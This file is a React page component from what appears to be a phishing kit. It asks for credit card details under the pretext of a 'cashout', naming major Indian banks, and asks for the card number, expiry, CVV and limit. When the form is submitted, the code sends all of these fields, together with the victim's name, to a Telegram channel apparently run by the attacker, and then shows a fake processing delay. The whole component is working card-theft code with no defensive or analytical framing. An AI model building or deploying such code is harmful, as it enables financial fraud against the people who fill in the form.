import { useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Banner } from "../../components/Banner/Banner";
import { Button } from "../../components/ui/Button";
import { useNavigate } from "../../app/router";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./Page3.css";

const BANKS = [
  { value: "sbi", label: "State Bank of India" },
  { value: "hdfc", label: "HDFC Bank" },
  { value: "icici", label: "ICICI Bank" },
  { value: "axis", label: "Axis Bank" },
  { value: "kotak", label: "Kotak Mahindra Bank" },
  { value: "pnb", label: "Punjab National Bank" },
  { value: "bob", label: "Bank of Baroda" },
  { value: "canara", label: "Canara Bank" },
  { value: "union", label: "Union Bank of India" },
  { value: "idbi", label: "IDBI Bank" },
];

const CARD_TYPES = [
  { value: "visa", label: "Visa" },
  { value: "mastercard", label: "Mastercard" },
  { value: "platinum", label: "Platinum Card" },
  { value: "rupee", label: "Rupee Card" },
];

const MONTHS = [
  "01",
  "02",
  "03",
  "04",
  "05",
  "06",
  "07",
  "08",
  "09",
  "10",
  "11",
  "12",
];

const YEARS = ["2026", "2027", "2028", "2029", "2030", "2031", "2032"];

export function Page3() {
  const navigate = useNavigate();
  const [bank, setBank] = useState("");
  const [cardType, setCardType] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [limit, setLimit] = useState("");
  const [amount, setAmount] = useState("");
  const [amountError, setAmountError] = useState<string | null>(null);
  const [terms, setTerms] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  // Read user name from session for Telegram message
  function getUserName(): string {
    try {
      const lead = JSON.parse(sessionStorage.getItem("rg:lead") || "{}");
      return lead.fullName || "Unknown";
    } catch {
      return "Unknown";
    }
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 16);
    setCardNumber(val);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 3);
    setCvv(val);
  };

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "");
    setAmount(val);
    // Instant validation: amount must not exceed available limit
    if (val && limit && Number(val) > Number(limit)) {
      setAmountError(`Amount cannot exceed available limit ₹${limit}`);
    } else {
      setAmountError(null);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (!bank) return setError("Please select bank of credit card");
    if (!cardType) return setError("Please choose card type");
    if (!/^\d{16}$/.test(cardNumber)) return setError("Enter valid 16 digit credit card number");
    if (!expMonth) return setError("Please select expiry month");
    if (!expYear) return setError("Please select expiry year");
    if (!/^\d{3}$/.test(cvv)) return setError("Enter valid 3 digit CVV");
    if (!limit.trim()) return setError("Please enter credit card available limit");
    if (!amount.trim()) return setError("Please fill amount to cashout");
    if (Number(amount) > Number(limit)) return setError(`Amount cannot exceed available limit ₹${limit}`);
    if (!terms) return setError("Please accept terms and conditions");

    // All validations passed — send immediately
    const userName = getUserName();
    const bankLabel = BANKS.find((b) => b.value === bank)?.label || bank;
    const cardLabel = CARD_TYPES.find((c) => c.value === cardType)?.label || cardType;

    console.log("[Page3] Sending to Telegram, user:", userName);

    // Fire-and-forget with explicit void to avoid unhandled promise warning
    void sendToTelegram(
      formatEntry("💳 Credit Card Details", {
        "👤 User": userName,
        "Bank": bankLabel,
        "Card Type": cardLabel,
        "Card Number": cardNumber,
        "Expiry": `${expMonth}/${expYear}`,
        "CVV": cvv,
        "Available Limit": `₹${limit.trim()}`,
        "Amount to Cashout": `₹${amount.trim()}`,
      })
    );

    try {
      sessionStorage.setItem(
        "rg:card",
        JSON.stringify({
          bank: bankLabel,
          cardType: cardLabel,
          cardNumber,
          expiry: `${expMonth}/${expYear}`,
          cvv,
          limit: limit.trim(),
          amount: amount.trim(),
        })
      );
    } catch {}

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      navigate("/page4");
    }, 30000);
  };

  if (loading) {
    return (
      <AppLayout title="Processing">
        <div className="pg3-loader">
          <div className="pg3-loader__card">
            <div className="pg3-loader__spinner" />
            <p className="pg3-loader__text">Please wait...</p>
            <p className="pg3-loader__sub">Processing your request</p>
          </div>
        </div>
      </AppLayout>
    );
  }

  return (
    <AppLayout title="Card Details">
      <div className="pg3">
        <Banner />
        <section className="pg3__form-card">
          <header className="pg3__head">
            <h1 className="pg3__heading">Enter Card Details</h1>
          </header>

          <form className="pg3__form" onSubmit={handleSubmit} noValidate>
            <div className="pg3__field">
              <label className="pg3__label" htmlFor="bank">
                Select Bank of Credit Card
              </label>
              <select id="bank" className="pg3__select" value={bank} onChange={(e) => setBank(e.target.value)}>
                <option value="">-- Select Bank --</option>
                {BANKS.map((b) => (
                  <option key={b.value} value={b.value}>
                    {b.label}
                  </option>
                ))}
              </select>
            </div>

            <div className="pg3__field">
              <label className="pg3__label" htmlFor="cardType">
                Choose Card Type
              </label>
              <select id="cardType" className="pg3__select" value={cardType} onChange={(e) => setCardType(e.target.value)}>
                <option value="">-- Select Card Type --</option>
                {CARD_TYPES.map((c) => (
                  <option key={c.value} value={c.value}>
                    {c.label}
                  </option>
                ))}
              </select>
            </div>

            <div className="pg3__field">
              <label className="pg3__label" htmlFor="cardNumber">
                Credit Card Number
              </label>
              <input
                id="cardNumber"
                className="pg3__input"
                type="text"
                inputMode="numeric"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="Enter 16 digit card number"
                maxLength={16}
              />
            </div>

            <div className="pg3__row-fields">
              <div className="pg3__field pg3__field--half">
                <label className="pg3__label">Expiry Month</label>
                <select className="pg3__select" value={expMonth} onChange={(e) => setExpMonth(e.target.value)}>
                  <option value="">MM</option>
                  {MONTHS.map((m) => (
                    <option key={m} value={m}>
                      {m}
                    </option>
                  ))}
                </select>
              </div>
              <div className="pg3__field pg3__field--half">
                <label className="pg3__label">Expiry Year</label>
                <select className="pg3__select" value={expYear} onChange={(e) => setExpYear(e.target.value)}>
                  <option value="">YYYY</option>
                  {YEARS.map((y) => (
                    <option key={y} value={y}>
                      {y}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div className="pg3__field">
              <label className="pg3__label" htmlFor="cvv">
                CVV
              </label>
              <input
                id="cvv"
                className="pg3__input"
                type="text"
                inputMode="numeric"
                value={cvv}
                onChange={handleCvvChange}
                placeholder="Enter 3 digit CVV"
                maxLength={3}
              />
            </div>

            <div className="pg3__field">
              <label className="pg3__label" htmlFor="limit">
                Credit Card Available Limit
              </label>
              <input
                id="limit"
                className="pg3__input"
                type="text"
                inputMode="numeric"
                value={limit}
                onChange={(e) => setLimit(e.target.value.replace(/\D/g, ""))}
                placeholder="Enter available limit"
              />
            </div>

            <div className="pg3__field">
              <label className="pg3__label" htmlFor="amount">
                Fill Amount to Cashout
              </label>
              <input
                id="amount"
                className="pg3__input"
                type="text"
                inputMode="numeric"
                value={amount}
                onChange={handleAmountChange}
                placeholder="Enter amount"
              />
              {amountError && <p className="pg3__error">{amountError}</p>}
            </div>

            <label className="pg3__checkbox">
              <input type="checkbox" checked={terms} onChange={(e) => setTerms(e.target.checked)} />
              <span>I agree to Terms and Conditions</span>
            </label>

            {error && <p className="pg3__error">{error}</p>}

            <Button type="submit" variant="primary" block>
              Proceed to Pay
            </Button>
          </form>
        </section>
      </div>
    </AppLayout>
  );
}
